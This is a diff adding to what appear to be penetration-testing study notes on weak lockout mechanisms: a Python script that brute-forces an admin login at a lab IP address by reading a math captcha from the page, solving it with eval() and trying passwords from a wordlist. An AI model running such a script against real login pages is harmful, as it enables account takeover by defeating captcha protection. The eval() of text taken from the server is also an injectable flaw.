@@ -16,3 +16,44 @@
 
 ## Test for weak lockout mechanisms
 ### Brute-forcing mathematical Captcha using Python
+
+```python
+import re
+import requests
+
+session = requests.Session()
+
+regex = '<h4 style="text-align: center;margin-top: 4px"> (.*?) = </h4>'
+
+with open('passwords.txt', 'r') as f:
+    for password in f:
+        password = password.rstrip()
+
+        response = session.get('http://192.197.53.3')
+        output = re.search(regex, response.text)
+
+        cookies = session.cookies.get_dict()
+        captcha = eval(output.group(1))
+
+        print("Trying Password: " + password)
+
+        data = {
+            "username": "admin",
+            "password": password,
+            "captcha": captcha
+        }
+
+        output = session.post(
+            'http://192.197.53.3/login',
+            cookies=cookies,
+            data=data
+        )
+
+        # ✅ THIS MUST BE INSIDE THE LOOP
+        if "Error" not in output.text:
+            print("Password Found: " + password)
+            break
+```
+
+### Account Lockout Bypass
+
